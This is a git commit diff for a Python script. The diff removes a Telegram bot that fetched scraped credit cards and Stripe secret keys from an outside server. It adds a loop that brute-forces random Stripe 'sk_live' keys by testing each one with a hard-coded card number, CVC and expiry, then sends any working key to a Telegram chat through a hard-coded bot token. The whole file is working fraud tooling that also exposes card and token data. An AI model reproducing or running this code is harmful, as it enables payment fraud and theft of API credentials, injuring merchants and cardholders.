467974bf983ea0e41db7972dcfaf5c860acca0b7
warrior1010 <134947432+warrior1010@users.noreply.github.com>
2023-07-24 17:43:43 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -1,91 +1,28 @@
-import telebot
-import os
-import time
-import requests
-from dotenv import load_dotenv
+import requests, random, string, time, os
 
-load_dotenv()
-tok = os.environ.get('bot_env')
-bot = telebot.TeleBot(tok)
+token = os.environ.get("6065289588:AAHijMfIdNifJFt_jePyYkG2S2xWoSmM704")
+chatid = os.environ.get("-1001683748221")
 
-@bot.message_handler(commands=['start'])
-def cmds(message):
-    bot.reply_to(message,text='Welcome. Hit /cmds or /help for available commands')
-
-@bot.message_handler(commands=['help','cmds'])
-def cmds(message):
-    bot.reply_to(message,text='''
-command - usage
-/scr - /scr heckerdrops 100 531462
-/scrsk - /scrsk heckerdrops 100
-    ''')
-
-@bot.message_handler(commands=['scr'])
-def scrape_cc(message):
-    try:
-        parts = message.text.split()
-        if len(parts) == 3:
-            chat_id = parts[1]
-            limit = parts[2]
-            bin = 'All'
-        elif len(parts) == 4:
-            chat_id = parts[1]
-            limit = parts[2]
-            bin = parts[3]
-        while True:
-            raw = requests.get(
-            'http://heckerdrops.live:5000/scrapper?chat_id='+chat_id+'&limit='+limit+'&bin='+bin+'',
-            timeout = 120 
-            ).json() 
-            if 'This event loop is already running' in raw:
-                time.sleep(5)
-                continue
-            else:
-                break
-        cards = raw['cards']
-        found = raw['found']
-        file = f'x{found} Scrapped.txt'
-        if cards is not None:
-            with open(file, "w+") as f:
-                f.write(cards)
-            with open(file, "rb") as f:
-                cap = '<b>Scrapped Sucessfully ✅\nTarget -» <code>'+chat_id.upper()+'</code>\nFound -» <code>'+found+'</code>\nBin -» <code>'+bin+'</code>\nREQ BY -» <code>'+message.from_user.first_name+'</code></b>'
-                bot.send_document(chat_id=message.chat.id, document=f, caption=cap,parse_mode='HTML')
-                os.remove(file)
-        elif cards is None:
-            bot.reply_to(message,text='No cards were found.')    
-    except Exception as e:
-        bot.reply_to(message,text=str(e))   
-
-@bot.message_handler(commands=['scrsk'])
-def scrape_sk(message):
-    try:
-        parts = message.text.split()
-        chat_id = parts[1]
-        limit = parts[2]
-        while True:
-            raw = requests.get(
-            'http://heckerdrops.live:5000/skscrapper?chat_id='+chat_id+'&limit='+limit,
-            timeout = 120 
-            ).json() 
-            if 'This event loop is already running' in raw:
-                time.sleep(5)
-                continue
-            else:
-                break    
-        cards = raw['sk']
-        found = raw['found']
-        file = f'x{found} Scrapped.txt'
-        if cards is not None:
-            with open(file, "w+") as f:
-                f.write(cards)
-            with open(file, "rb") as f:
-                cap = '<b>Scrapped Sucessfully ✅\nTarget -» <code>'+chat_id.upper()+'</code>\nFound -» <code>'+found+'</code>\nREQ BY -» <code>'+message.from_user.first_name+'</code></b>'
-                bot.send_document(chat_id=message.chat.id, document=f, caption=cap,parse_mode='HTML')
-                os.remove(file)
-        elif cards is None:
-            bot.reply_to(message,text='No sk were found.')    
-    except Exception as e:
-        bot.reply_to(message,text=str(e))   
-
-bot.polling()
+def long_key():
+  skkey = random.choice(['sk_live_51H', 'sk_live_51J', 'sk_live_51I', 'sk_live_51M', 'sk_live_51G', 'sk_live_518', 'sk_live_51C', 'sk_live_51F', 'sk_live_519', 'sk_live_51N', 'sk_live_51L', 'sk_live_51D'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
+  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
+  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
+    print(f"DEAD > {skkey}")
+  else:
+    print(f"LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    
+def short_key():
+  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
+  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
+  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
+    print(f"DEAD > {skkey}")
+  else:
+    print(f"LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    
+while True:
+  long_key()
+  #time.sleep(0.5) #if your heroku account keeps getting banned
+  short_key()
+    
